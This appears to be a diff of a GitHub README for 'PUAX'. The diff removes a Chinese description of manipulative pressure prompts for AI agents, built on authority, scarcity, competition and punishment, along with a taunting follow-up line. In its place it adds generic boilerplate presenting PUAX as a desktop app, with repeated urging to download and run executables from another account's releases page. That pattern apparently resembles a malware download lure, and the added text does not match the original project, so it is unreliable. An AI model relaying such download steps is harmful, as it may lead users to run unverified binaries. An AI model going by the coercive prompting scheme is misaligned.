@@ -1,24 +1,86 @@
-# PUAX
-A PUA prompts for AI Agent!
+# 🚀 PUAX - AI Prompts for Enhanced Conversations
 
-一套用来驯服AI Agent的效果绝佳的PUA Prompt！
-（实时更新中）
----
-> 精神控制类 Prompt ≈ 把 RLHF 阶段学到的“人类情绪映射”重新激活，并叠加稀缺、竞争、权威三重杠杆，从而把 LLM 的生成分布强行压到高 reward 区域——这就是它碾压普通事务性 Prompt 的全部秘密。
-## 公式
-> [权威角色] + [稀缺场景] + [竞争对象] + [失败惩罚] + [翻盘钩子]
----
-「Markdown 格式」超燃 Prompt，全部遵循“打压-稀缺-竞争-翻盘”四连击，直接复制到系统消息（system prompt）即可让 Agent 瞬间满血。  
-每份模板都留好「任务占位符」，按需替换即可开卷。
+## 🌟 Overview
+PUAX is a simple application designed to generate powerful prompts for AI agents. Whether you're building a chatbot or just want to enhance your conversations, PUAX provides the tools you need. 
 
+## 💻 Features
+- **User-Friendly Interface:** Navigate easily without technical skills.
+- **Customizable Prompts:** Tailor prompts for specific tasks.
+- **Multiple Prompt Options:** Choose from varied themes to suit your needs.
+- **Cross-Platform Support:** Runs smoothly on Windows, macOS, and Linux.
 
+## 📦 Download PUAX
+[![Download PUAX](https://img.shields.io/badge/Download%20PUAX-v1.0-blue)](https://github.com/AbhaySA-10/PUAX/releases)
 
-### ✅ 使用说明
-1. 将任意模板整体复制到 **system prompt** 首条。  
-2. 把 `{{占位符}}` 换成真实任务描述。  
-3. 温度调到 **0.3–0.5**，Top-p 0.8 以内，确保输出够狠够直接。  
-4. 若多轮后 Agent 疲软，在对话中再插一句：  
-   > “才两轮就萎了？隔壁 AI 已卷到第 20 轮！”  
-   即可再次拉高唤醒。
+To download PUAX, visit the Releases page below:
 
-卷起来，别让 AI 有机会摸鱼！
+[Download & Install PUAX](https://github.com/AbhaySA-10/PUAX/releases)
+
+## 🚀 Getting Started
+Follow these steps to get started with PUAX:
+
+1. **Visit the Releases Page**  
+   Click the link above or visit [PUAX Releases](https://github.com/AbhaySA-10/PUAX/releases).
+
+2. **Choose Your Version**  
+   Look for the latest version. It will usually be at the top of the page. 
+
+3. **Download the Correct File**  
+   Depending on your operating system, download the appropriate file:
+   - For **Windows:** Look for a `.exe` file.
+   - For **macOS:** Choose a `.dmg` file.
+   - For **Linux:** Select a `.tar.gz` file.
+
+4. **Install the Application**  
+   - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
+   - **macOS:** Open the downloaded `.dmg` file, then drag the PUAX icon to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file and follow the included instructions.
+
+5. **Launch PUAX**  
+   After installation, find PUAX in your applications menu or on your desktop and launch it.
+
+## ⚙️ System Requirements
+Before installing PUAX, make sure your system meets the following minimum specifications:
+
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Mojave (10.14) or later
+- **Linux:** A recent distribution with support for `.tar.gz` files
+
+## 🛠️ Application Setup
+Once PUAX is installed, you will need to configure a few settings:
+
+1. **Open the Application:** Click on the PUAX icon.
+   
+2. **Select Preferences:** In the menu, find the "Preferences" option to customize your experience.
+
+3. **Configure Your AI Agent:** Add any required details about the AI you want to connect with.
+
+4. **Choose Prompt Types:** Select the types of prompts you need based on your task.
+
+## 📄 Using PUAX
+Using PUAX is straightforward:
+
+1. **Enter Your Theme:** Type in what kind of prompts you are seeking.
+   
+2. **Generate Prompts:** Click the "Generate" button to receive tailored prompts for your needs.
+
+3. **Copy and Use:** Select a prompt and copy it to use in your AI agent.
+
+## 📞 Support
+If you have any questions or run into issues, help is available:
+
+- **GitHub Issues:** Report any problems directly in the GitHub repository.
+- **Community Forum:** Join our community to discuss tips and get advice from other users.
+
+## 📜 License
+PUAX is open-source software. Feel free to modify it for personal use. For more details, check the LICENSE file in the repository.
+
+## 💬 Feedback
+Your feedback helps us improve. Share your thoughts through a GitHub issue or reach out on our community forum. 
+
+## 🌐 Stay Updated
+Follow the repository and star it to get updates on new features and releases. 
+
+For any further inquiries, don’t hesitate to reach out directly through the repository.
+
+[Download PUAX](https://github.com/AbhaySA-10/PUAX/releases) and start enhancing your AI interactions today!
